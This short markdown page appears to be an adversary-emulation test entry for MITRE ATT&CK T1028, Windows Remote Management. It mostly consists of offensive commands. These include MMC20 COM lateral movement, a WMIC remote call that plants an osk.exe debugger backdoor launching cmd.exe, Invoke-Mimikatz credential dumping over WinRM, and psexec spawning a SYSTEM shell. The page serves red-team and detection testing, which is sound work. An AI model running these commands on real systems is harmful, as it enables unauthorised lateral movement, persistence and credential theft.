## Windows Remote Management

MITRE ATT&CK Technique: [T1028](https://attack.mitre.org/wiki/Technique/T1028)

### Enable Windows Remote Management

Input:

    powershell Enable-PSRemoting -Force

### Powershell lateral movement using the mmc20 application com object

Input:

    powershell.exe [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","<computer_name>")).Documnet.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe", $null, $null, "7")

Reference:

https://blog.cobaltstrike.com/2017/01/24/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/


### WMIC Process Call Create

    wmic /user:<username> /password:<password> /node:<computer_name> process call create "C:\Windows\system32\reg.exe add \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe\" /v \"Debugger\" /t REG_SZ /d \"cmd.exe\" /f"

### PowerSploit Invoke-Mimikatz WinRM

    powershell-import /local/path/to/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1
    powershell Invoke-Mimikatz -ComputerName TARGET

Reference:

 https://blog.cobaltstrike.com/2015/07/22/winrm-is-my-remote-access-tool/
 
 ### psexec
 
Input:
 
`psexec \\host -u domain\user -p password -s cmd.exe`

Note:

Using psexec will start a new process and create an EVENT ID on the remote host.
